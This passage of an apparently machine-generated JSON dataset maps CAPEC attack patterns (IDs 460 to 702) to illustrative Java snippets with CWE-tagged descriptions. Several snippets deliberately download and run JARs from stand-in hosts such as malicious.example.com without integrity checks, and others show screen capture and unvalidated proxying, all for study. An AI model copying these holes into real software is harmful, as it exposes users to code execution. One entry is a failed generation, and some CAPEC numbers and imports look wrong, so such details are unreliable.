        "code_snippet": "public class FirmwareDevice {\n    private final byte[] firmware;\n    private final boolean isUpdateable;\n\n    public FirmwareDevice(byte[] firmware, boolean isUpdateable) {\n        this.firmware = firmware;\n        this.isUpdateable = isUpdateable;\n    }\n\n    public void updateFirmware(byte[] newFirmware) throws UnsupportedOperationException {\n        if (!isUpdateable) {\n            throw new UnsupportedOperationException(\"Firmware cannot be updated.\");\n        }\n        System.arraycopy(newFirmware, 0, firmware, 0, newFirmware.length);\n    }\n\n    public static void main(String[] args) {\n        byte[] initialFirmware = new byte[]{0x01, 0x02, 0x03};\n        FirmwareDevice device = new FirmwareDevice(initialFirmware, false);\n\n        try {\n            byte[] newFirmware = new byte[]{0x04, 0x05, 0x06};\n            device.updateFirmware(newFirmware);\n        } catch (UnsupportedOperationException e) {\n            System.out.println(e.getMessage());\n        }\n    }\n}",
        "description": "This Java code snippet defines a `FirmwareDevice` class that simulates a device with firmware that may or may not be updateable. The `updateFirmware` method attempts to update the firmware but throws an `UnsupportedOperationException` if the device is not updateable. The `main` method demonstrates creating a device with non-updateable firmware and attempting to update it, resulting in an exception. This code embodies the main idea of CAPEC-460 by illustrating a device with unpatchable firmware, highlighting the vulnerability described in CWE-1277 (Firmware Not Updateable) and CWE-1329 (Reliance on Component That is Not Updateable)."
    },
    {
        "capec_id": "690",
        "capec_name": "Metadata Spoofing",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MetadataSpoofingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"downloaded.jar\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            in.close();\n            fos.close();\n\n            // Load the downloaded JAR file\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"downloaded.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.example.MaliciousClass\");\n            Runnable instance = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            instance.run();\n\n            // CWE-348: Use of Less Trusted Source\n            // CWE-290: Authentication Bypass by Spoofing\n            // CWE-1230: Exposure of Sensitive Information Through Metadata\n            // CWE-941: Incorrectly Specified Destination in a Communication Channel\n            // Simulate metadata spoofing by altering metadata\n            File file = new File(\"downloaded.jar\");\n            if (file.exists()) {\n                System.out.println(\"File metadata: \" + file.getName() + \", size: \" + file.length());\n                // Spoofing metadata\n                System.out.println(\"Spoofed metadata: trusted_source.jar, size: 12345\");\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where metadata spoofing can occur. The code downloads a JAR file from a remote location without performing any integrity checks (CWE-494). It then loads and executes a class from the downloaded JAR file, which could be malicious. The code also simulates metadata spoofing by altering the metadata of the downloaded file, presenting it as a trusted source. This example highlights the risks associated with using less trusted sources (CWE-348), potential authentication bypass by spoofing (CWE-290), exposure of sensitive information through metadata (CWE-1230), and incorrectly specified destinations in communication channels (CWE-941)."
    },
    {
        "capec_id": "691",
        "capec_name": "Spoof Open-Source Software Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-library.jar\";\n        String fileName = \"malicious-library.jar\";\n        try {\n            downloadFile(url, fileName);\n            loadLibrary(fileName);\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void loadLibrary(String fileName) throws Exception {\n        File file = new File(fileName);\n        URL url = file.toURI().toURL();\n        URLClassLoader classLoader = new URLClassLoader(new URL[]{url});\n        Class<?> cls = classLoader.loadClass(\"com.example.MaliciousClass\");\n        cls.getDeclaredMethod(\"execute\").invoke(null);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software update mechanism that embodies the CAPEC 'Spoof Open-Source Software Metadata'. The code downloads a JAR file from a specified URL and loads it without verifying its integrity or origin (CWE-494). The URL used could be spoofed to point to a malicious file, and the code does not perform any checks to ensure the file is from a trusted source (CWE-348). The downloaded file is then loaded and executed, potentially containing embedded malicious code (CWE-506). This example highlights the risks of depending on third-party components without proper validation (CWE-1395) and the potential for authentication bypass by spoofing (CWE-290)."
    },
    {
        "capec_id": "692",
        "capec_name": "Spoof Version Control System Commit Metadata",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableVCS {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.zip\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"repo.zip\");\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // Unzip the downloaded repository (potentially malicious)\n            unzip(\"repo.zip\", \"./repo\");\n\n            // CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\n            File repoDir = new File(\"./repo\");\n            if (repoDir.exists()) {\n                System.out.println(\"Repository downloaded and extracted.\");\n            }\n\n            // CWE-540: Inclusion of Sensitive Information in Source Code\n            File sensitiveFile = new File(\"./repo/.git/config\");\n            if (sensitiveFile.exists()) {\n                BufferedReader br = new BufferedReader(new FileReader(sensitiveFile));\n                String line;\n                while ((line = br.readLine()) != null) {\n                    System.out.println(line); // Potentially exposing sensitive information\n                }\n                br.close();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void unzip(String zipFilePath, String destDir) throws IOException {\n        File dir = new File(destDir);\n        if (!dir.exists()) dir.mkdirs();\n        FileInputStream fis = new FileInputStream(zipFilePath);\n        ZipInputStream zis = new ZipInputStream(fis);\n        ZipEntry ze = zis.getNextEntry();\n        while (ze != null) {\n            File newFile = new File(destDir, ze.getName());\n            new File(newFile.getParent()).mkdirs();\n            FileOutputStream fos = new FileOutputStream(newFile);\n            byte[] buffer = new byte[1024];\n            int len;\n            while ((len = zis.read(buffer)) > 0) {\n                fos.write(buffer, 0, len);\n            }\n            fos.close();\n            zis.closeEntry();\n            ze = zis.getNextEntry();\n        }\n        zis.closeEntry();\n        zis.close();\n        fis.close();\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where a version control system (VCS) repository is downloaded and extracted without verifying its integrity (CWE-494). The repository is then stored in a directory that could be accessible to unauthorized actors (CWE-527). Additionally, the code reads and prints the contents of a potentially sensitive file within the repository, which could expose sensitive information (CWE-540). This embodies the main idea of the CAPEC by showing how an adversary could spoof VCS commit metadata to deceive users into trusting and using a malicious repository."
    },
    {
        "capec_id": "693",
        "capec_name": "StarJacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class VulnerableDownloader {\n    public static void main(String[] args) {\n        String url = \"http://example.com/malicious-package.jar\";\n        String fileName = \"malicious-package.jar\";\n        try {\n            downloadFile(url, fileName);\n            executeFile(fileName);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public static void downloadFile(String url, String fileName) throws IOException {\n        try (BufferedInputStream in = new BufferedInputStream(new URL(url).openStream());\n             FileOutputStream fileOutputStream = new FileOutputStream(fileName)) {\n            byte dataBuffer[] = new byte[1024];\n            int bytesRead;\n            while ((bytesRead = in.read(dataBuffer, 0, 1024)) != -1) {\n                fileOutputStream.write(dataBuffer, 0, bytesRead);\n            }\n        }\n    }\n\n    public static void executeFile(String fileName) throws IOException {\n        Runtime.getRuntime().exec(\"java -jar \" + fileName);\n    }\n}",
        "description": "This Java code snippet demonstrates a vulnerable software downloader that embodies the concept of 'StarJacking'. The code downloads a JAR file from a specified URL and executes it without performing any integrity checks or verifying the source. This represents CWE-494 (Download of Code Without Integrity Check) and CWE-348 (Use of Less Trusted Source). The downloaded file could contain malicious code (CWE-506), and the code does not ensure the trustworthiness of the source, making it susceptible to attacks. This scenario highlights the risk of relying on potentially spoofed popularity metadata to download and execute software, which is the main idea behind the 'StarJacking' attack pattern."
    },
    {
        "capec_id": "694",
        "capec_name": "System Location Discovery",
        "code_snippet": "import java.util.TimeZone;\nimport java.util.Locale;\nimport java.util.Properties;\nimport java.io.FileInputStream;\nimport java.io.IOException;\n\npublic class SystemLocationDiscovery {\n    public static void main(String[] args) {\n        // Collecting system timezone\n        TimeZone timeZone = TimeZone.getDefault();\n        System.out.println(\"System Timezone: \" + timeZone.getID());\n\n        // Collecting system locale\n        Locale locale = Locale.getDefault();\n        System.out.println(\"System Locale: \" + locale.getDisplayName());\n\n        // Collecting system properties\n        Properties properties = new Properties();\n        try {\n            properties.load(new FileInputStream(\"/path/to/system/properties/file\"));\n            System.out.println(\"System Properties: \" + properties);\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'System Location Discovery' by collecting and printing the system's timezone, locale, and properties. The code gathers sensitive system information that could be used by an adversary to identify the system's geographical location. The use of `TimeZone.getDefault()` and `Locale.getDefault()` methods exposes the system's timezone and locale, respectively. Additionally, the code attempts to load system properties from a file, which could expose sensitive information if the file is not properly secured. This snippet embodies CWE-497 by exposing sensitive system information, CWE-529 by potentially accessing an ACL file, and CWE-360 by trusting system event data (timezone and locale) that can be spoofed. The code highlights the risks associated with improper handling and exposure of system-level information."
    },
    {
        "capec_id": "695",
        "capec_name": "Repo Jacking",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class RepoJackingExample {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://example.com/malicious-repo.jar\");\n            InputStream in = url.openStream();\n            Files.copy(in, Paths.get(\"malicious-repo.jar\"), StandardCopyOption.REPLACE_EXISTING);\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new URL(\"file:malicious-repo.jar\")});\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n            maliciousCode.run();\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a scenario where an application downloads a JAR file from an untrusted source (CWE-494) and then loads and executes a class from this JAR file (CWE-829). The code does not perform any integrity checks on the downloaded file, making it vulnerable to 'Repo Jacking'. An attacker could exploit this by redirecting the URL to a malicious repository, tricking the application into executing harmful code. This example highlights the risks associated with downloading and executing code from untrusted sources without proper validation."
    },
    {
        "capec_id": "696",
        "capec_name": "Load Value Injection",
        "code_snippet": "public class LoadValueInjection {\n    private static final int SECRET = 0x12345678; // Sensitive data\n    private static final int[] cache = new int[256]; // Shared microarchitectural structure\n\n    public static void main(String[] args) {\n        int attackerControlledIndex = getAttackerControlledIndex();\n        try {\n            // Induce a page fault or microcode assist\n            int value = loadValue(attackerControlledIndex);\n            // Transient execution using adversary-controlled data\n            transientExecution(value);\n        } catch (Exception e) {\n            // Handle exception\n        }\n    }\n\n    private static int getAttackerControlledIndex() {\n        // Simulate an attacker controlling the index\n        return 300; // Out of bounds to induce a fault\n    }\n\n    private static int loadValue(int index) throws Exception {\n        if (index >= cache.length) {\n            throw new Exception(\"Page fault or microcode assist\");\n        }\n        return cache[index];\n    }\n\n    private static void transientExecution(int value) {\n        // Simulate transient execution using the adversary-controlled data\n        if (value == SECRET) {\n            System.out.println(\"Sensitive data accessed: \" + SECRET);\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of Load Value Injection (LVI). The main idea is to exploit a hardware design flaw in CPU transient instruction execution. The code simulates an attacker controlling an index to induce a page fault or microcode assist, causing the CPU to transiently execute with adversary-controlled data. The 'loadValue' method simulates loading a value that may cause a fault, and 'transientExecution' uses this value in a way that could potentially expose sensitive information. This represents the concept of exploiting microarchitectural state and transient execution to access sensitive data."
    },
    {
        "capec_id": "697",
        "capec_name": "DHCP Spoofing",
        "code_snippet": "User intervention needed!",
        "description": "The model failed to generate a description for this code snippet. Error: Could not parse response content as the length limit was reached - CompletionUsage(completion_tokens=4096, prompt_tokens=423, total_tokens=4519, completion_tokens_details=CompletionTokensDetails(reasoning_tokens=0))"
    },
    {
        "capec_id": "698",
        "capec_name": "Install Malicious Extension",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class MaliciousExtension {\n    public static void main(String[] args) {\n        try {\n            // CWE-494: Download of Code Without Integrity Check\n            URL url = new URL(\"http://malicious.example.com/malicious.jar\");\n            InputStream in = url.openStream();\n            FileOutputStream fos = new FileOutputStream(\"malicious.jar\");\n            byte[] buffer = new byte[4096];\n            int bytesRead;\n            while ((bytesRead = in.read(buffer)) != -1) {\n                fos.write(buffer, 0, bytesRead);\n            }\n            fos.close();\n            in.close();\n\n            // CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n            URLClassLoader classLoader = new URLClassLoader(new URL[]{new File(\"malicious.jar\").toURI().toURL()});\n            Class<?> clazz = classLoader.loadClass(\"com.malicious.MaliciousClass\");\n            Runnable maliciousCode = (Runnable) clazz.getDeclaredConstructor().newInstance();\n\n            // CWE-507: Trojan Horse\n            System.out.println(\"Executing trusted functionality...\");\n            maliciousCode.run(); // This runs the malicious code\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates the concept of 'Install Malicious Extension' by downloading and executing a malicious JAR file. The code embodies several related CWEs: \n\n1. CWE-494: The code downloads a JAR file from a remote location without verifying its integrity or origin.\n2. CWE-829: The downloaded JAR file is loaded and executed, which includes functionality from an untrusted source.\n3. CWE-507: The code appears to perform a benign action (printing a message) but also executes hidden malicious code.\n\nThe main idea is to show how an adversary can trick a user into installing and running a malicious extension, leading to potential security breaches."
    },
    {
        "capec_id": "699",
        "capec_name": "Eavesdropping on a Monitor",
        "code_snippet": "import java.awt.GraphicsDevice;\nimport java.awt.GraphicsEnvironment;\nimport java.awt.Robot;\nimport java.awt.image.BufferedImage;\nimport javax.imageio.ImageIO;\nimport java.io.File;\nimport java.io.IOException;\n\npublic class ScreenEavesdropper {\n    public static void main(String[] args) {\n        try {\n            // Get the screen device\n            GraphicsDevice screen = GraphicsEnvironment.getLocalGraphicsEnvironment().getDefaultScreenDevice();\n            Robot robot = new Robot(screen);\n\n            // Capture the screen content\n            BufferedImage screenCapture = robot.createScreenCapture(screen.getDefaultConfiguration().getBounds());\n\n            // Save the captured image to a file (cleartext storage)\n            File outputfile = new File(\"screen_capture.png\");\n            ImageIO.write(screenCapture, \"png\", outputfile);\n\n            System.out.println(\"Screen content captured and saved.\");\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a simplified version of eavesdropping on a monitor's content. The code captures the screen content using the Robot class and saves it as a cleartext image file. This represents the CAPEC 'Eavesdropping on a Monitor' by capturing the screen's content without modifying any cables or installing software on the target system. The code also touches on CWE-319 (Cleartext Transmission of Sensitive Information) by saving the captured screen content in an unencrypted format, making it vulnerable to unauthorized access. Additionally, it indirectly relates to CWE-1300 (Improper Protection of Physical Side Channels) as it captures and stores sensitive information without adequate protection."
    },
    {
        "capec_id": "700",
        "capec_name": "Network Boundary Bridging",
        "code_snippet": "import java.io.*;\nimport java.net.*;\n\npublic class NetworkBoundaryBridge {\n    public static void main(String[] args) {\n        try {\n            // Establish a connection to a trusted network\n            Socket trustedSocket = new Socket(\"trusted-network.com\", 8080);\n            DataOutputStream trustedOut = new DataOutputStream(trustedSocket.getOutputStream());\n            DataInputStream trustedIn = new DataInputStream(trustedSocket.getInputStream());\n\n            // Establish a connection to an untrusted network\n            Socket untrustedSocket = new Socket(\"untrusted-network.com\", 9090);\n            DataOutputStream untrustedOut = new DataOutputStream(untrustedSocket.getOutputStream());\n            DataInputStream untrustedIn = new DataInputStream(untrustedSocket.getInputStream());\n\n            // Bridging data between trusted and untrusted networks\n            String dataFromTrusted = trustedIn.readUTF();\n            untrustedOut.writeUTF(dataFromTrusted);\n\n            String dataFromUntrusted = untrustedIn.readUTF();\n            trustedOut.writeUTF(dataFromUntrusted);\n\n            // Close connections\n            trustedSocket.close();\n            untrustedSocket.close();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}",
        "description": "This Java code snippet demonstrates a basic example of 'Network Boundary Bridging' where a program establishes connections to both a trusted and an untrusted network. It then bridges data between these two networks without proper validation or security checks. This embodies the main idea of CAPEC-160, where an adversary could exploit such a setup to bridge trusted and untrusted networks. The code also reflects related CWEs: it does not ensure the integrity of the communication channels (CWE-924), does not verify the identity of endpoints (CWE-300), and mixes trusted and untrusted data (CWE-501). This lack of proper access control and validation can lead to significant security vulnerabilities."
    },
    {
        "capec_id": "701",
        "capec_name": "Browser in the Middle (BiTM)",
        "code_snippet": "import java.io.*;\nimport java.net.*;\nimport javax.servlet.*;\nimport javax.servlet.http.*;\n\npublic class VulnerableRemoteDesktopServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n        String targetUrl = request.getParameter(\"targetUrl\");\n        if (targetUrl == null || targetUrl.isEmpty()) {\n            response.sendError(HttpServletResponse.SC_BAD_REQUEST, \"Missing target URL\");\n            return;\n        }\n\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        if (!targetUrl.startsWith(\"http://trusted-domain.com\")) {\n            response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Untrusted domain\");\n            return;\n        }\n\n        // CWE-830: Inclusion of Web Functionality from an Untrusted Source\n        URL url = new URL(targetUrl);\n        HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n        connection.setRequestMethod(\"GET\");\n\n        // CWE-294: Authentication Bypass by Capture-replay\n        String sessionId = request.getParameter(\"sessionId\");\n        if (sessionId != null) {\n            connection.setRequestProperty(\"Cookie\", \"JSESSIONID=\" + sessionId);\n        }\n\n        // CWE-345: Insufficient Verification of Data Authenticity\n        InputStream inputStream = connection.getInputStream();\n        BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream));\n        String line;\n        while ((line = reader.readLine()) != null) {\n            response.getWriter().println(line);\n        }\n        reader.close();\n    }\n}",
        "description": "This Java servlet code snippet demonstrates a vulnerable implementation of a remote desktop connection through a web browser, embodying the 'Browser in the Middle (BiTM)' attack. The servlet accepts a 'targetUrl' parameter, which is intended to be a trusted domain but is only superficially checked (CWE-602). It includes web functionality from the specified URL, potentially from an untrusted source (CWE-830). The code also demonstrates a capture-replay vulnerability by accepting a 'sessionId' parameter and using it directly in the request headers (CWE-294). Additionally, the code does not verify the authenticity of the data received from the target URL (CWE-345). This setup allows an adversary to exploit the browser's functionalities to establish a remote desktop connection to their system, bypassing security measures."
    },
    {
        "capec_id": "702",
        "capec_name": "Exploiting Incorrect Chaining or Granularity of Hardware Debug Components",
        "code_snippet": "public class DebugComponent {\n    private boolean isAuthorized;\n    private boolean debugMode;\n    private String sensitiveData;\n\n    public DebugComponent(boolean isAuthorized) {\n        this.isAuthorized = isAuthorized;\n        this.debugMode = false;\n        this.sensitiveData = \"Sensitive Trace Data\";\n    }\n\n    public void enableDebugMode() {\n        if (isAuthorized) {\n            debugMode = true;\n            System.out.println(\"Debug mode enabled.\");\n        } else {\n            System.out.println(\"Unauthorized access to debug mode.\");\n        }\n    }\n\n    public void accessSensitiveData() {\n        if (debugMode) {\n            System.out.println(\"Accessing: \" + sensitiveData);\n        } else {\n            System.out.println(\"Debug mode not enabled. Cannot access sensitive data.\");\n        }\n    }\n\n    public static void main(String[] args) {\n        DebugComponent component = new DebugComponent(true);\n        component.enableDebugMode();\n        component.accessSensitiveData();\n\n        DebugComponent unauthorizedComponent = new DebugComponent(false);\n        unauthorizedComponent.enableDebugMode();\n        unauthorizedComponent.accessSensitiveData();\n    }\n}",
        "description": "This Java code snippet represents a simplified model of a hardware debug component with improper access control. The `DebugComponent` class has a constructor that sets whether the user is authorized. The `enableDebugMode` method checks if the user is authorized before enabling debug mode. The `accessSensitiveData` method allows access to sensitive data only if debug mode is enabled. This code demonstrates the main idea of CAPEC-1296, where incorrect chaining or granularity of debug components can lead to unauthorized access. It also touches on CWE-1191 by showing improper access control to debug functionality and sensitive data."
    }
]